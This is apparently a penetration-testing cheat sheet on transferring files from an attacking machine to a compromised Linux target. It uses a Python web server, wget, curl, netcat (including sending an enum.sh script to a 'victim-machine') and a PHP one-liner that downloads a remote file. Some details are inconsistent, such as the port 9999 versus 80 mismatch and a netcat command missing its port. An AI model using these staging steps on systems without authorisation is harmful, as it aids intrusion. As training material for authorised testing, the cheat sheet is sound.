### Transfer Files on Linux

### Set Up a Simple Python Webserver

For the examples using `curl`  and `wget` we need to download from a web-server. This is an easy way to set up a web-server. This command will make the entire folder, from where you issue the command, available on port 9999.

```
python3 -m http.server 80
```

### Wget

You can download files using `wget` like this:

```
wget 192.168.1.102:9999/file.txt
```

### Curl

```
curl -O http://192.168.0.101/file.txt
```

### Netcat

Another easy way to transfer files is by using netcat.

If you can't have an interactive shell it might be risky to start listening on a port, since it could be that the attacking-machine is unable to connect. So you are left hanging and can't do `ctr-c` because that will kill your session.

So instead you can connect from the target machine like this.

On attacking machine:

```bash
nc -lvp 4444 < file
```

On target machine:

```bash
nc 192.168.1.102 4444 > file
```

You can of course also do it the risky way, the other way around:

So on the victim-machine we run `nc` like this:

```bash
nc -lvp 3333 > enum.sh
```

And on the attacking machine we send the file like this:

```bash
nc 192.168.1.103 < enum.sh
```

I have sometimes received this error:

```
This is nc from the netcat-openbsd package. An alternative nc is available
```

I have just run this command instead:

```
nc -l 1234 > file.sh
```


### With php

```
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
